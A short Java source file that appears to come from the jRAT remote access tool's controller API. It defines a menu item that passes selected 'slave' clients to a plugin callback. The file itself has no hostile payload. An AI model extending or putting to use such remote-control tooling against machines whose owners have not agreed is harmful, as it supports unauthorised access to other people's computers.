package jrat.api;

import jrat.controller.AbstractSlave;
import jrat.controller.ui.frames.Frame;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.List;

public class ClientMenuItem {

    private String text;
    private ImageIcon icon;
    private ClientMenuListener listener;

    public ClientMenuItem(String name, ImageIcon icon, ClientMenuListener listener) {
        this.text = name;
        this.icon = icon;
        this.listener = listener;
    }

    /**
     * returns a swing JMenuItem created from this class
     * @return swing JMenuItem
     */
    public JMenuItem getJMenuItem() {
        JMenuItem item = new JMenuItem(this.text);
        item.setIcon(this.icon);

        item.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                List<AbstractSlave> slaves = Frame.panelClients.getSelectedSlaves();

                if (slaves.size() == 1) {
                    listener.onClick(slaves.get(0));
                } else if (slaves.size() > 1) {
                    listener.onClick((AbstractSlave[]) slaves.toArray());
                }
            }
        });

        return item;
    }
}
